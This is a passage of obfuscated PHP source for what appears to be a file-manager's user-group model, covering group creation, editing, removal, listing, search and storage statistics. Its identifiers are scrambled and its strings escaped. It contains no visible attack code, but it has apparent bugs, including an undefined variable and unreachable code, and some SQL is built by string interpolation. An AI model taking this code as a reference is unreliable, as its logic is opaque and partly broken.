IO::remove($åñ°ÄÂï[$¤‹ŒŒš¬[97]]); Model($¤‹ŒŒš¬[2051])->delete($åñ°ÄÂï[$¤‹ŒŒš¬[550]]); $this->where($ü³µİË¼)->delete(); $this->metaSet($åñ°ÄÂï[$¤‹ŒŒš¬[550]], null, null); write_log(ACTION . $¤‹ŒŒš¬[2052] . KodUser::id() . $¤‹ŒŒš¬[2053] . $åñ°ÄÂï[$¤‹ŒŒš¬[550]] . $¤‹ŒŒš¬[2054] . $åñ°ÄÂï[$¤‹ŒŒš¬[89]] . $¤‹ŒŒš¬[211] . $åñ°ÄÂï[$¤‹ŒŒš¬[97]], $¤‹ŒŒš¬[2055]); return; } if ($åñ°ÄÂï[$¤‹ŒŒš¬[2046]] != $Ó”ØÒÇ—) { $this->where($ü³µİË¼)->save(array($¤‹ŒŒš¬[2039] => $Ó”ØÒÇ—)); } } public function storageInfo($«÷•“–ù = false) { $İÀ²“˜ =& $_SERVER[÷ôÚîå]; $™Éô¸½  = $this->count() + 0.0; $ö„ç˜ƒ = 0; $áæÔî™ˆ = 1; $·™ìšï = 0; $û³»¼»Í = 5000; for ($‰ó‘ôËŒ = 0; $‰ó‘ôËŒ < $™Éô¸½ ; $‰ó‘ôËŒ = $‰ó‘ôËŒ + $û³»¼»Í) { $ßòåµß = $this->limit($‰ó‘ôËŒ, $‰ó‘ôËŒ + $û³»¼»Í)->select(); foreach ($ßòåµß as $•²õïù) { $áæÔî™ˆ += $•²õïù[$İÀ²“˜[89]] * $•²õïù[$İÀ²“˜[2046]]; $ö„ç˜ƒ += $•²õïù[$İÀ²“˜[89]] * ($•²õïù[$İÀ²“˜[2046]] - 1); $·™ìšï += $•²õïù[$İÀ²“˜[2046]]; } } $ƒ»•çÅ = array($İÀ²“˜[2056] => $áæÔî™ˆ, $İÀ²“˜[2057] => $ö„ç˜ƒ, $İÀ²“˜[2058] => $ö„ç˜ƒ / $áæÔî™ˆ, $İÀ²“˜[93] => $™Éô¸½ , $İÀ²“˜[2059] => $·™ìšï); return $ƒ»•çÅ; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\x70"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\x61\x6d\145" => "\147\162\x6f\165\x70\137\155\145\164\141", "\155\x65\164\141\106\x69\145\154\x64" => "\147\162\157\165\x70\x49\x44"); protected function cacheFunctionAlias($Â÷¸ß€°) { $ıÇÄé“Ø =& $_SERVER[÷ôÚîå]; return array($ıÇÄé“Ø[2060] => array($Â÷¸ß€°[0], $ıÇÄé“Ø[2061]), $ıÇÄé“Ø[2062] => array($Â÷¸ß€°[0], $ıÇÄé“Ø[2063])); } protected function getInfo($÷¦¢åÎÑ, $ƒ©¿ÅŸ = false) { $×çÏ¯²Ù = $this->getInfoSimple($÷¦¢åÎÑ); if (!$×çÏ¯²Ù) { return !1; } if ($ƒ©¿ÅŸ) { return $this->_listDataApplyItem($×çÏ¯²Ù); } return $this->cacheFunctionGet($_SERVER[÷ôÚîå][2064], $÷¦¢åÎÑ); } protected function getInfoSimple($³ƒÚêˆ‚, $›„Ç—œë = false) { $Ç÷ÅÄ± =& $_SERVER[÷ôÚîå]; if ($›„Ç—œë) { $áú£‚Â‰ = array($Ç÷ÅÄ±[1978] => intval($³ƒÚêˆ‚)); $úäÅˆïˆ = $this->where($áú£‚Â‰)->find(); return is_array($úäÅˆïˆ) ? $úäÅˆïˆ : array(); } return $this->cacheFunctionGet($Ç÷ÅÄ±[2065], $³ƒÚêˆ‚); } protected function groupAdd($ÄÈ„ıšğ) { $•‰ÀÀŞ» =& $_SERVER[÷ôÚîå]; if (!$ÄÈ„ıšğ[$•‰ÀÀŞ»[202]] && isset($ÄÈ„ıšğ[$•‰ÀÀŞ»[1978]]) && $ÄÈ„ıšğ[$•‰ÀÀŞ»[1978]] == 1) { if ($ªƒëˆŠÙ = $this->getInfoSimple($ÄÈ„ıšğ[$•‰ÀÀŞ»[1978]], !0)) { return $ÄÈ„ıšğ[$•‰ÀÀŞ»[1978]]; } } else { $ªƒëˆŠÙ = $this->getInfoSimple($ÄÈ„ıšğ[$•‰ÀÀŞ»[202]]); if (!$ªƒëˆŠÙ) { return !1; } } $Ä´Ö = $•‰ÀÀŞ»[603]; if ($ªƒëˆŠÙ[$•‰ÀÀŞ»[593]]) { $Ä´Ö = $ªƒëˆŠÙ[$•‰ÀÀŞ»[593]] . $ªƒëˆŠÙ[$•‰ÀÀŞ»[1978]] . $•‰ÀÀŞ»[50]; } $İÛå­â = array($•‰ÀÀŞ»[503] => $this->groupNameAuto($ÄÈ„ıšğ[$•‰ÀÀŞ»[202]], $ÄÈ„ıšğ[$•‰ÀÀŞ»[32]]), $•‰ÀÀŞ»[486] => $ÄÈ„ıšğ[$•‰ÀÀŞ»[202]], $•‰ÀÀŞ»[661] => $Ä´Ö, $•‰ÀÀŞ»[2066] => $ÄÈ„ıšğ[$•‰ÀÀŞ»[1964]], $•‰ÀÀŞ»[2067] => 0, $•‰ÀÀŞ»[1982] => 0); if (isset($ÄÈ„ıšğ[$•‰ÀÀŞ»[2002]])) { $İÛå­â[$•‰ÀÀŞ»[2002]] = $ÄÈ„ıšğ[$•‰ÀÀŞ»[2002]]; } else { $—ûñ€Ò¸ = $this->max($•‰ÀÀŞ»[2002]); if (!$—ûñ€Ò¸) { $—ûñ€Ò¸ = 0; } $İÛå­â[$•‰ÀÀŞ»[2002]] = $—ûñ€Ò¸ + 1; } if (!empty($ÄÈ„ıšğ[$•‰ÀÀŞ»[1978]])) { $İÛå­â[$•‰ÀÀŞ»[1978]] = $ÄÈ„ıšğ[$•‰ÀÀŞ»[1978]]; } $¼‹Ş³á° = $this->add($İÛå­â); $this->setNamePinyin($¼‹Ş³á°, $İÛå­â[$•‰ÀÀŞ»[32]]); if (isset($ÄÈ„ıšğ[$•‰ÀÀŞ»[2068]])) { $this->metaSet($¼‹Ş³á°, array($•‰ÀÀŞ»[2068] => $ÄÈ„ıšğ[$•‰ÀÀŞ»[2068]], $•‰ÀÀŞ»[2069] => $ÄÈ„ıšğ[$•‰ÀÀŞ»[2069]])); unset($ÄÈ„ıšğ[$•‰ÀÀŞ»[2068]]); unset($ÄÈ„ıšğ[$•‰ÀÀŞ»[2069]]); } Model($•‰ÀÀŞ»[1429])->groupRootAdd($¼‹Ş³á°); $this->_clearCache($ÄÈ„ıšğ[$•‰ÀÀŞ»[202]]); return $¼‹Ş³á°; } protected function groupEdit($•–¿èí”, $£œ‚¦ ï) { $—Æà½¥Ş =& $_SERVER[÷ôÚîå]; $Û¯”¦ƒó = $this->getInfoSimple($•–¿èí”); if (!$Û¯”¦ƒó) { return !1; } if (!empty($£œ‚¦ ï[$—Æà½¥Ş[202]])) { $¹§Ğ™¡ = $this->getInfoSimple($£œ‚¦ ï[$—Æà½¥Ş[202]]); if (!$¹§Ğ™¡) { return !1; } if ($Û¯”¦ƒó[$—Æà½¥Ş[1978]] == $¹§Ğ™¡[$—Æà½¥Ş[1978]]) { return !1; } if ($£œ‚¦ ï[$—Æà½¥Ş[202]] != $Û¯”¦ƒó[$—Æà½¥Ş[202]]) { if ($¹§Ğ™¡[$—Æà½¥Ş[593]] !== $Û¯”¦ƒó[$—Æà½¥Ş[593]] && strpos($¹§Ğ™¡[$—Æà½¥Ş[593]], $Û¯”¦ƒó[$—Æà½¥Ş[593]] . $Û¯”¦ƒó[$—Æà½¥Ş[1978]] . $—Æà½¥Ş[50]) === 0) { return !1; } $£œ‚¦ ï[$—Æà½¥Ş[661]] = $¹§Ğ™¡[$—Æà½¥Ş[593]] . $£œ‚¦ ï[$—Æà½¥Ş[202]] . $—Æà½¥Ş[50]; $this->_changeChildLevel($Û¯”¦ƒó, $¹§Ğ™¡); $this->_clearCache($¹§Ğ™¡[$—Æà½¥Ş[1978]]); $this->_clearCache($Û¯”¦ƒó[$—Æà½¥Ş[202]]); } } if (isset($£œ‚¦ ï[$—Æà½¥Ş[32]])) { $this->setNamePinyin($•–¿èí”, $£œ‚¦ ï[$—Æà½¥Ş[32]]); } if (isset($£œ‚¦ ï[$—Æà½¥Ş[2068]])) { $this->metaSet($•–¿èí”, array($—Æà½¥Ş[2068] => $£œ‚¦ ï[$—Æà½¥Ş[2068]], $—Æà½¥Ş[2069] => $£œ‚¦ ï[$—Æà½¥Ş[2069]])); unset($£œ‚¦ ï[$—Æà½¥Ş[2068]]); unset($£œ‚¦ ï[$—Æà½¥Ş[2069]]); } $this->_clearChildrenCache($Û¯”¦ƒó); return $this->where(array($—Æà½¥Ş[2070] => $•–¿èí”))->save($£œ‚¦ ï); } private function _clearChildrenCache($¢¤ëåó) { $Œı¼Ø‚ =& $_SERVER[÷ôÚîå]; $İ¼ªÂâ¯ = array($Œı¼Ø‚[661] => array($Œı¼Ø‚[621], $¢¤ëåó[$Œı¼Ø‚[593]] . $¢¤ëåó[$Œı¼Ø‚[1978]] . $Œı¼Ø‚[622])); $ı‡²Ãœ = $this->field($Œı¼Ø‚[1978])->where($İ¼ªÂâ¯)->select(); foreach ($ı‡²Ãœ as $²ÑÉçò˜) { $this->_clearCache($²ÑÉçò˜[$Œı¼Ø‚[1978]]); } } private function _clearCache($´ªÓ‚Íö) { $•­‹öªå =& $_SERVER[÷ôÚîå]; $this->cacheFunctionClear($•­‹öªå[2064], $´ªÓ‚Íö); $this->cacheFunctionClear($•­‹öªå[2065], $´ªÓ‚Íö); } private function _changeChildLevel($·¿¤â¤Å, $¥•©¨»ò, $­ÁÂ™äø = false) { $ÜÁÆŞÁ =& $_SERVER[÷ôÚîå]; $Áıº˜„Ó = $·¿¤â¤Å[$ÜÁÆŞÁ[593]] . $·¿¤â¤Å[$ÜÁÆŞÁ[1978]] . $ÜÁÆŞÁ[50]; $¢¼™ó = $¥•©¨»ò[$ÜÁÆŞÁ[593]] . $¥•©¨»ò[$ÜÁÆŞÁ[1978]] . $ÜÁÆŞÁ[50] . $·¿¤â¤Å[$ÜÁÆŞÁ[1978]] . $ÜÁÆŞÁ[50]; if ($­ÁÂ™äø) { $¢¼™ó = $¥•©¨»ò[$ÜÁÆŞÁ[593]] . $¥•©¨»ò[$ÜÁÆŞÁ[1978]] . $ÜÁÆŞÁ[50]; } $ó—ç±ı¿ = array($ÜÁÆŞÁ[661] => array($ÜÁÆŞÁ[621], $·¿¤â¤Å[$ÜÁÆŞÁ[593]] . $·¿¤â¤Å[$ÜÁÆŞÁ[1978]] . $ÜÁÆŞÁ[622])); $Ãóñû²ã = array($ÜÁÆŞÁ[661] => array($ÜÁÆŞÁ[670], "\162\145\x70\x6c\x61\143\145\50\x70\x61\x72\145\156\164\x4c\x65\x76\x65\x6c\x2c\x27{$Áıº˜„Ó}\47\54\x27{$¢¼™ó}\47\x29")); $this->_clearChildrenCache($·¿¤â¤Å); $this->where($ó—ç±ı¿)->data($Ãóñû²ã)->save(); } public function setNamePinyin($Ìèå¡®, $³¾ñø„ê = false) { $š®Îİâˆ =& $_SERVER[÷ôÚîå]; if (!$³¾ñø„ê) { $›©ŞÕ• = $this->getInfoSimple($Ìèå¡®); $³¾ñø„ê = $›©ŞÕ•[$š®Îİâˆ[32]]; } if (!Input::check($³¾ñø„ê, $š®Îİâˆ[664])) { $this->metaSet($Ìèå¡®, $š®Îİâˆ[547], null); $this->metaSet($Ìèå¡®, $š®Îİâˆ[546], null); return; } $Çøü‚íÆ = array($š®Îİâˆ[547] => str_replace($š®Îİâˆ[53], $š®Îİâˆ[12], Pinyin::get($³¾ñø„ê)), $š®Îİâˆ[546] => Pinyin::get($³¾ñø„ê, $š®Îİâˆ[665])); $this->metaSet($Ìèå¡®, $Çøü‚íÆ); } protected function groupStatus($óİºˆŸÎ, $óŠ·ÛÜŸ) { $¨íÛ•û =& $_SERVER[÷ôÚîå]; $ŒĞÆû– = $this->getInfoSimple($óİºˆŸÎ); if (!$ŒĞÆû–) { return !1; } $this->_clearCache($óİºˆŸÎ); return $this->metaSet($óİºˆŸÎ, $¨íÛ•û[839], $óŠ·ÛÜŸ); if ($óŠ·ÛÜŸ == $¨íÛ•û[101]) { $‡ÇõÃß¼ = $this->parentLevelArray($ŒĞÆû–[$¨íÛ•û[593]]); } else { } $‡ÇõÃß¼[] = $ŒĞÆû–[$¨íÛ•û[1978]]; $Ñ­ÛŠç = array(); foreach ($‡ÇõÃß¼ as $óİºˆŸÎ) { $Ñ­ÛŠç[] = array($¨íÛ•û[1978] => $óİºˆŸÎ, $¨íÛ•û[107] => $¨íÛ•û[839], $¨íÛ•û[459] => $óŠ·ÛÜŸ); $this->_clearCache($óİºˆŸÎ); } return Model($¨íÛ•û[2071])->addAll($Ñ­ÛŠç, array(), !0); } protected function groupRemove($ÉÕ½ã°¯, $á¹·¡ÏÃ = false) { $´ÈÑ›…ü =& $_SERVER[÷ôÚîå]; $ÎĞÑäÑ“ = array($´ÈÑ›…ü[1978] => $ÉÕ½ã°¯); $„ŸÆ¾àŸ = $this->where($ÎĞÑäÑ“)->find(); if (!$„ŸÆ¾àŸ || $„ŸÆ¾àŸ[$´ÈÑ›…ü[202]] == 0) { return !1; } if (!$á¹·¡ÏÃ) { $´¾á¼üæ = $this->getInfoSimple($„ŸÆ¾àŸ[$´ÈÑ›…ü[202]]); $this->_changeChildLevel($„ŸÆ¾àŸ, $´¾á¼üæ, !0); $this->where(array($´ÈÑ›…ü[202] => $ÉÕ½ã°¯))->save(array($´ÈÑ›…ü[202] => $„ŸÆ¾àŸ[$´ÈÑ›…ü[202]])); $this->_clearCache($´¾á¼üæ[$´ÈÑ›…ü[1978]]); } Model($´ÈÑ›…ü[2071])->where($ÎĞÑäÑ“)->delete(); Model($´ÈÑ›…ü[2072])->where($ÎĞÑäÑ“)->delete(); Model($´ÈÑ›…ü[914])->groupRootRemove($ÉÕ½ã°¯); $this->_clearCache($„ŸÆ¾àŸ[$´ÈÑ›…ü[202]]); return $this->where($ÎĞÑäÑ“)->delete(); } protected function groupSort($õêäï¢û) { $È¶éµ‚• =& $_SERVER[÷ôÚîå]; $ñ­’«Ü = array(); foreach ($õêäï¢û as $—â¢à°è => $†šíÎ“”) { $ñ­’«Ü[] = array($È¶éµ‚•[1978], $†šíÎ“”, $È¶éµ‚•[2002], $—â¢à°è + 1); } $this->saveAll($ñ­’«Ü); } public function listData() { $–¤Œ°óô = $this->_makeOrder()->selectPage(50); $this->_listDataApply($–¤Œ°óô[$_SERVER[÷ôÚîå][454]]); return $–¤Œ°óô; } private function _makeOrder($®©ŒÀç = '') { $ÙªÔõıÀ =& $_SERVER[÷ôÚîå]; $š¢ä¦ = array($ÙªÔõıÀ[1978], $ÙªÔõıÀ[32], $ÙªÔõıÀ[1966], $ÙªÔõıÀ[241]); $µø¢ºïõ = array($ÙªÔõıÀ[532] => $ÙªÔõıÀ[533], $ÙªÔõıÀ[534] => $ÙªÔõıÀ[535]); $×Û¶ó¤È = Input::get($ÙªÔõıÀ[539], $ÙªÔõıÀ[7], $ÙªÔõıÀ[1982], $š¢ä¦); $æÔÃñáÚ = Input::get($ÙªÔõıÀ[540], $ÙªÔõıÀ[7], $ÙªÔõıÀ[2073], array($ÙªÔõıÀ[2073], $ÙªÔõıÀ[534])); $æÔÃñáÚ = $µø¢ºïõ[$æÔÃñáÚ]; $®©ŒÀç = $®©ŒÀç . "{$×Û¶ó¤È}\40{$æÔÃñáÚ}\54\40\x67\162\x6f\165\160\111\x44\40\x61\163\143"; return $this->order($®©ŒÀç); } public function listChild($ûÚŸáí¢) { $ªƒÖƒ”Ñ =& $_SERVER[÷ôÚîå]; $Ü©ª–ÓÖ = $this->where(array($ªƒÖƒ”Ñ[202] => $ûÚŸáí¢))->_makeOrder()->selectPage(200); $this->_listDataApply($Ü©ª–ÓÖ[$ªƒÖƒ”Ñ[454]]); return $Ü©ª–ÓÖ; } public function listChildIds($ëËçáÃ) { $²í›‰àñ =& $_SERVER[÷ôÚîå]; if (is_string($ÉÁåáÒ )) { $ëËçáÃ = explode($²í›‰àñ[50], $ëËçáÃ); } $ß·ÒÏæÍ = $this->where(array($²í›‰àñ[1978] => array($²í›‰àñ[7], $ëËçáÃ)))->field($²í›‰àñ[2074])->select(); if (!$ß·ÒÏæÍ) { return !1; } $»ÛÂÏá = array(); foreach ($ß·ÒÏæÍ as $¶œ›…Ù‡) { $»ÛÂÏá[] = "\x73\145\x6c\145\143\x74\40\x67\162\157\x75\160\x49\x44\x20\146\x72\157\155\40\140\x67\162\x6f\165\x70\x60\x20\x77\150\145\162\145\x20\x70\141\162\x65\156\x74\x4c\145\166\145\154\40\x6c\151\153\145\x20\47{$¶œ›…Ù‡[$²í›‰àñ[593]]}{$¶œ›…Ù‡[$²í›‰àñ[1978]]}\54\x25\47"; } $»ÛÂÏá = implode($²í›‰àñ[2075], $»ÛÂÏá); $ß·ÒÏæÍ = $this->query($»ÛÂÏá); if (!$ß·ÒÏæÍ) { return array(); } $ëËçáÃ = array_to_keyvalue($ß·ÒÏæÍ, $²í›‰àñ[12], $²í›‰àñ[1978]); return array_unique($ëËçáÃ); } public function listByID($±¥§Ö¨) { $²Æ¼ãİ¡ =& $_SERVER[÷ôÚîå]; if (!$±¥§Ö¨) { return array(); } $ÌÊã¡Ìª = array($²Æ¼ãİ¡[1978] => array($²Æ¼ãİ¡[7], $±¥§Ö¨)); $‡Ïú²ıú = $this->where($ÌÊã¡Ìª)->select(); $‡Ïú²ıú = array_sort_keep($‡Ïú²ıú, $²Æ¼ãİ¡[1978], $±¥§Ö¨); $this->_listDataApply($‡Ïú²ıú); return $‡Ïú²ıú; } public function listSearch($ÓˆıÍÍ) { $ÄÇÁ¿ü… =& $_SERVER[÷ôÚîå]; $öº‡ÜÚÏ = trim($ÓˆıÍÍ[$ÄÇÁ¿ü…[2076]]); $ÆñğßÑÊ = explode($ÄÇÁ¿ü…[53], $öº‡ÜÚÏ); if (!$öº‡ÜÚÏ || count($ÆñğßÑÊ) == 1) { return $this->listSearchNow($ÓˆıÍÍ); } $±…ô»ìÂ = array($ÄÇÁ¿ü…[454] => array()); foreach ($ÆñğßÑÊ as $ç•§± ) { if (!trim($ç•§± )) { continue; } $ÓˆıÍÍ[$ÄÇÁ¿ü…[2076]] = $ç•§± ; $°­°ìŞü = $this->listSearchNow($ÓˆıÍÍ); $±…ô»ìÂ[$ÄÇÁ¿ü…[454]] = array_merge($±…ô»ìÂ[$ÄÇÁ¿ü…[454]], $°­°ìŞü[$ÄÇÁ¿ü…[454]]); } $±…ô»ìÂ[$ÄÇÁ¿ü…[454]] = array_unique_by_key($±…ô»ìÂ[$ÄÇÁ¿ü…[454]], $ÄÇÁ¿ü…[1978]); $±…ô»ìÂ[$ÄÇÁ¿ü…[451]] = array($ÄÇÁ¿ü…[452] => count($±…ô»ìÂ[$ÄÇÁ¿ü…[454]]), $ÄÇÁ¿ü…[448] => 20, $ÄÇÁ¿ü…[438] => 1, $ÄÇÁ¿ü…[453] => 1); return $±…ô»ìÂ; } public function listSearchNow($ú†ş…Âß) { $ïéñÜ¨» =& $_SERVER[÷ôÚîå]; $Å¼—şŒš = trim($ú†ş…Âß[$ïéñÜ¨»[2076]]); $ÄƒºıÇª = isset($ú†ş…Âß[$ïéñÜ¨»[2077]]) ? $ú†ş…Âß[$ïéñÜ¨»[2077]] : !1; if (!trim($Å¼—şŒš)) { return !1; } $Å¼—şŒš = str_replace($ïéñÜ¨»[2078], $ïéñÜ¨»[2079], $Å¼—şŒš); $ÑÆ¾¼é± = array($ïéñÜ¨»[1978] => array($ïéñÜ¨»[468], "{$Å¼—şŒš}\45"), $ïéñÜ¨»[32] => array($ïéñÜ¨»[468], "\45{$Å¼—şŒš}\x25"), $ïéñÜ¨»[1089] => $ïéñÜ¨»[2080]); if ($ÄƒºıÇª) { $ìœ³À– = $this->getInfoSimple($ÄƒºıÇª); $±Ø×Ù‰± = $ìœ³À–[$ïéñÜ¨»[593]] . $ÄƒºıÇª . $ïéñÜ¨»[622]; $ÑÆ¾¼é± = array($ÑÆ¾¼é±, array($ïéñÜ¨»[593] => array($ïéñÜ¨»[468], $±Ø×Ù‰±))); } $ÑÆ¾¼é± = $this->parseWhereLike($ÑÆ¾¼é±); $¼”Û¸„¿ = $this->_makeOrder()->where($ÑÆ¾¼é±)->selectPage(20); $¼”Û¸„¿ = $¼”Û¸„¿ ? $¼”Û¸„¿ : array($ïéñÜ¨»[454] => array(), $ïéñÜ¨»[451] => array()); if (!$¼”Û¸„¿ || count($¼”Û¸„¿[$ïéñÜ¨»[454]]) < 5 && Input::check($Å¼—şŒš, $ïéñÜ¨»[403])) { $È¨Úœ¬ = $this->groupChildrenAll($ÄƒºıÇª); $¦ÉóË¶² = $this->_searchFromMeta($ïéñÜ¨»[546], $Å¼—şŒš, 10, $È¨Úœ¬); $±‰Å‰«¦ = $this->_searchFromMeta($ïéñÜ¨»[547], $Å¼—şŒš, 10, $È¨Úœ¬); $µÖÉéòÓ = array_merge($¦ÉóË¶², $±‰Å‰«¦, $¼”Û¸„¿[$ïéñÜ¨»[454]]); $¼”Û¸„¿[$ïéñÜ¨»[454]] = array_unique_by_key($µÖÉéòÓ, $ïéñÜ¨»[1978]); $¼”Û¸„¿[$ïéñÜ¨»[451]][$ïéñÜ¨»[452]] = count($¼”Û¸„¿[$ïéñÜ¨»[454]]); $¼”Û¸„¿[$ïéñÜ¨»[451]][$ïéñÜ¨»[453]] = ceil($¼”Û¸„¿[$ïéñÜ¨»[451]][$ïéñÜ¨»[452]] / $¼”Û¸„¿[$ïéñÜ¨»[451]][$ïéñÜ¨»[448]]); } $this->_listDataApply($¼”Û¸„¿[$ïéñÜ¨»[454]]); return $¼”Û¸„¿; } protected function groupChildrenAll($¤ÁïğƒŠ) { $›÷éÏ‚ =& $_SERVER[÷ôÚîå]; if (!$¤ÁïğƒŠ) { return !1; } if (!is_array($¤ÁïğƒŠ)) { $¤ÁïğƒŠ = array($¤ÁïğƒŠ); } $ä“±ğµ = $¤ÁïğƒŠ; foreach ($¤ÁïğƒŠ as $Å¸¿Ğ÷) { $©«¸Ôı = $this->getInfoSimple($Å¸¿Ğ÷); $½…¨ğª = array($›÷éÏ‚[593] => array($›÷éÏ‚[468], $©«¸Ôı[$›÷éÏ‚[593]] . $Å¸¿Ğ÷ . $›÷éÏ‚[622])); $¡¶¥¢ = $this->field($›÷éÏ‚[1978])->where($½…¨ğª)->select(); $ä“±ğµ = array_merge($ä“±ğµ, array_to_keyvalue($¡¶¥¢, $›÷éÏ‚[12], $›÷éÏ‚[1978])); } return array_unique($ä“±ğµ); } private function _searchFromMeta($¤÷Å¨², $ó‡’ÉÓ˜, $ìïŸ¯Èİ, $Á†‚—°Ò) { $İ¿Ü™ =& $_SERVER[÷ôÚîå]; $ó‡’ÉÓ˜ = strtolower($ó‡’ÉÓ˜); $ÑªÜ¶±ù = array($İ¿Ü™[107] => $¤÷Å¨², $İ¿Ü™[459] => array($İ¿Ü™[468], "\x25{$ó‡’ÉÓ˜}\x25")); $ÑªÜ¶±ù = $this->parseWhereLike($ÑªÜ¶±ù); if ($Á†‚—°Ò) { $ÑªÜ¶±ù[$İ¿Ü™[1978]] = array($İ¿Ü™[7], $Á†‚—°Ò); } $««ÛïÒ = Model($İ¿Ü™[2081])->where($ÑªÜ¶±ù)->limit($ìïŸ¯Èİ)->select(); if (!$««ÛïÒ) { return array(); } $««ÛïÒ = array_to_keyvalue($««ÛïÒ, $İ¿Ü™[12], $İ¿Ü™[1978]); $‘ÌşÛß† = $this->where(array($İ¿Ü™[2070] => array($İ¿Ü™[7], $««ÛïÒ)))->select(); if (!$‘ÌşÛß†) { return array(); } return $‘ÌşÛß†; } protected function _listDataApplyItem($ÅŞÕ²±Ã) { $åËåØò = array($ÅŞÕ²±Ã); $this->_listDataApply($åËåØò); return $åËåØò[0]; } protected function _listDataApply(&$íèşÜÎæ) { $şüÖ‚— =& $_SERVER[÷ôÚîå]; if (!$íèşÜÎæ) { return; } $›€úü¡¹ = array_to_keyvalue($íèşÜÎæ, $şüÖ‚—[12], $şüÖ‚—[1978]); $this->_listAppendChildren($íèşÜÎæ); $this->_listAppendChildrenMember($íèşÜÎæ); $this->_listAppendMeta($íèşÜÎæ, $›€úü¡¹); $this->_listAppendParent($íèşÜÎæ); $this->_listAppendSourceRoot($íèşÜÎæ, $›€úü¡¹); } private function _listAppendChildren(&$©·üáÛ¸) { $Üáì£ğô =& $_SERVER[÷ôÚîå]; $Ş©«…» = array_to_keyvalue($©·üáÛ¸, $Üáì£ğô[12], $Üáì£ğô[1978]); $½œ•Û×É = array($Üáì£ğô[202] => array($Üáì£ğô[7], $Ş©«…»)); $É‰Ì¡¦ = array($Üáì£ğô[202], $Üáì£ğô[2082] => $Üáì£ğô[574]); $éÈğ“¤¥ = $this->field($É‰Ì¡¦)->where($½œ•Û×É)->group($Üáì£ğô[202])->select(); $³Èñ¾¶Ã = array_to_keyvalue($éÈğ“¤¥, $Üáì£ğô[202], $Üáì£ğô[574]); foreach ($©·üáÛ¸ as &$êÆá’“Õ) { $°î·Ûˆù = $êÆá’“Õ[$Üáì£ğô[1978]]; $êÆá’“Õ[$Üáì£ğô[2083]] = isset($³Èñ¾¶Ã[$°î·Ûˆù]) ? intval($³Èñ¾¶Ã[$°î·Ûˆù]) : !1; } unset($êÆá’“Õ); } private function _listAppendChildrenMember(&$±½¥ÓÕá) { $ù…ì»™´ =& $_SERVER[÷ôÚîå]; $»ıÙ—¹Ñ = array_to_keyvalue($±½¥ÓÕá, $ù…ì»™´[12], $ù…ì»™´[1978]); $¿™àÆ’† = array($ù…ì»™´[1978] => array($ù…ì»™´[7], $»ıÙ—¹Ñ)); $úİè§• = array($ù…ì»™´[1978], $ù…ì»™´[2082] => $ù…ì»™´[574]); $À°¾éìÃ = Model($ù…ì»™´[2072])->field($úİè§•)->where($¿™àÆ’†)->group($ù…ì»™´[1978])->select(); $Ìñãâ–Ò = array_to_keyvalue($À°¾éìÃ, $ù…ì»™´[1978], $ù…ì»™´[574]); foreach ($±½¥ÓÕá as &$ß¡şÓ×“) { $û×·úşš = $ß¡şÓ×“[$ù…ì»™´[1978]]; $ß¡şÓ×“[$ù…ì»™´[2084]] = isset($Ìñãâ–Ò[$û×·úşš]) ? intval($Ìñãâ–Ò[$û×·úşš]) : !1; } unset($ß¡şÓ×“); } private function _listAppendMeta(&$Ù¢éêï, $¬»ÙçÓ) { $İĞÕò–± =& $_SERVER[÷ôÚîå]; $®ğ³„Ë§ = array($İĞÕò–±[1978] => array($İĞÕò–±[7], $¬»ÙçÓ)); $íâŒæÌ = Model($İĞÕò–±[2071])->where($®ğ³„Ë§)->select(); $íâŒæÌ = array_to_keyvalue_group($íâŒæÌ, $İĞÕò–±[1978]); foreach ($íâŒæÌ as &$ÕıÔ‚­ª) { $ÕıÔ‚­ª = array_to_keyvalue($ÕıÔ‚­ª, $İĞÕò–±[107], $İĞÕò–±[459]); } unset($ÕıÔ‚­ª); foreach ($Ù¢éêï as &$Ã¼ŞÅ’ô) { $Ã¼ŞÅ’ô[$İĞÕò–±[548]] = array(); if (isset($íâŒæÌ[$Ã¼ŞÅ’ô[$İĞÕò–±[1978]]])) { $Ã¼ŞÅ’ô[$İĞÕò–±[548]] = $íâŒæÌ[$Ã¼ŞÅ’ô[$İĞÕò–±[1978]]]; } } unset($Ã¼ŞÅ’ô); } protected function parentLevelArray($·»ù¿•) { $Œâ”ŸçÉ =& $_SERVER[÷ôÚîå]; $·»ù¿• = explode($Œâ”ŸçÉ[50], trim($·»ù¿•, $Œâ”ŸçÉ[50])); $·»ù¿• = array_remove_value($·»ù¿•, $Œâ”ŸçÉ[238]); return $·»ù¿•; } protected function parentInGroup($úğ­–µä, $ÕíÕÈÖÒ) { $Öß¹ßŞñ =& $_SERVER[÷ôÚîå]; $í¡ğ¼ÊÇ = $this->getInfoSimple($úğ­–µä); if (!$í¡ğ¼ÊÇ) { return !0; } $§èº…÷ = $this->parentLevelArray($í¡ğ¼ÊÇ[$Öß¹ßŞñ[593]]); $§èº…÷[] = $úğ­–µä; foreach ($§èº…÷ as $úğ­–µä) { if (in_array($úğ­–µä . $Öß¹ßŞñ[12], $ÕíÕÈÖÒ)) { return !0; } } return !1; } private function _listAppendParent(&$±ş÷›Òé) { $À©°Õ¸ =& $_SERVER[÷ôÚîå]; $İüš€âŒ = array(); foreach ($±ş÷›Òé as &$„Ì”°ºµ) { $İüš€âŒ[$„Ì”°ºµ[$À©°Õ¸[1978]]] = $„Ì”°ºµ[$À©°Õ¸[32]]; $½ıöğå = $this->parentLevelArray($„Ì”°ºµ[$À©°Õ¸[593]]); foreach ($½ıöğå as $†ÙƒøÆÁ) { if (!isset($İüš€âŒ[$†ÙƒøÆÁ])) { $İüš€âŒ[$†ÙƒøÆÁ] = 0; } } } unset($„Ì”°ºµ); foreach ($İüš€âŒ as $Üí‡Ş„ => $ÒœßÉßƒ) { if ($ÒœßÉßƒ) { continue; } $¤¸ ò“« = $this->getInfoSimple($Üí‡Ş„); $İüš€âŒ[$Üí‡Ş„] = $¤¸ ò“«[$À©°Õ¸[32]]; } $ÁèªµµÂ = $GLOBALS[$À©°Õ¸[6]][$À©°Õ¸[102]][$À©°Õ¸[2085]]; if (KodUser::isRoot()) { $ÁèªµµÂ = !1; } foreach ($±ş÷›Òé as &$„Ì”°ºµ) { $½ıöğå = $this->parentLevelArray($„Ì”°ºµ[$À©°Õ¸[593]]); $£¨Ø¿­· = $À©°Õ¸[12]; foreach ($½ıöğå as $Üí‡Ş„ => $†ÙƒøÆÁ) { if ($ÁèªµµÂ && $Üí‡Ş„ == 0) { continue; } $£¨Ø¿­· .= $İüš€âŒ[$†ÙƒøÆÁ] . $À©°Õ¸[8]; } if ($½ıöğå) { $£¨Ø¿­· .= 